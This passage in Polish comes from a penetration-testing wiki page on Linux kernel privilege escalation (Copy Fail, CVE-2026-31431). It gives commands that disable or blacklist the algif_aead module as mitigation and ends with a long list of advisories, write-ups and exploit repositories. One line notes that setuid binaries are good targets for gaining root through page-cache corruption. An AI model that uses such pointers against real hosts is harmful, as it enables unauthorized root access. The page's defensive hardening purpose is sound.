- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- binaria setuid są dobrymi celami, ponieważ poprawka obejmująca wyłącznie page cache może wystarczyć, by uzyskać uprawnienia roota z lokalnego footholdu

#### Ograniczanie powierzchni ataku dla ścieżki `algif_aead`

Jeśli podatny interfejs jest udostępniany przez ładowalny moduł:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Jeśli jest skompilowany w jądrze, w niektórych zgłoszeniach opisywano blokowanie ścieżki init za pomocą:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Tę metodę łagodzenia skutków warto pamiętać także w przypadku innych kernel LPE: jeśli exploit zależy od konkretnego opcjonalnego interfejsu, wyłączenie go lub umieszczenie na czarnej liście może przerwać ścieżkę exploita, nawet zanim będzie dostępna pełna aktualizacja kernela.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – przejęcie skryptu uruchamianego przez root w katalogu PaperCut z prawem zapisu dla użytkownika](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ujawnienie podatności CVE-2026-31431 na liście Openwall oss-security](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Poprawka w stabilnej gałęzi Linux: crypto: algif_aead — powrót do działania poza miejscem docelowym](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — poradnik dotyczący CVE-2026-31431](https://copy.fail/)
- [7] [Techniczny opis Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repozytorium DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i wykorzystanie wariantu Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Poprawka w Linux: net: skb: zachowanie `SKBFL_SHARED_FRAG` w `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Wcześniejsze łagodzenie skutków w Linux: ustawienie `SKBFL_SHARED_FRAG` dla pakietów UDP przesyłanych przez splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Haki Git](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — strona podręcznika Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacja Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Powiązania aplikacji MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specyfikacja Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specyfikacja Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Język Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: podatność page cache w Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Dokumentacja Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Dokumentacja Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Dokumentacja konfiguracji Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentacja generatorów systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — inżynieria wykrywania w Linux: mechanizmy utrzymywania dostępu](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
